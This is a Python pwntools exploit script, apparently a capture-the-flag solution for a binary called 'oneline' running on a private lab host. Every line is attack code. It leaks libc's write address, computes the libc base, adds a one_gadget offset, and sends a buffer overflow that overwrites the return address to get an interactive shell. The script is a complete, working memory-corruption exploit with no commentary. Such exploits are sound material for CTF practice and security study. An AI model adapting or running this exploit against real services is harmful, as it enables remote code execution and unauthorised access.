from pwn import *

elf = ELF("./oneline")
libc = ELF("./libc.so.6")

script = '\n'.join([
    "break main",
    "continue",
    ])
#p = gdb.debug(elf.path,gdbscript=script)
p = remote("192.168.122.219",9002)

p.recvuntil(">> ")
p.sendline("AAAA")
p.recvuntil("AAAA\n")
p.recv(0x20 - 5)
addr_libc_write = u64(p.recv(8))
addr_libc_base = addr_libc_write - libc.symbols['write']
addr_one_gadget = addr_libc_base + 0x4f322

log.info("addr_libc_write = " + hex(addr_libc_write))
log.info("addr_libc_base = " + hex(addr_libc_base))
log.info("addr_one_gadget = " + hex(addr_one_gadget))

p.recvuntil(">> ")
buf = b"A"*0x20
buf += p64(addr_one_gadget)
p.send(buf)




p.interactive()
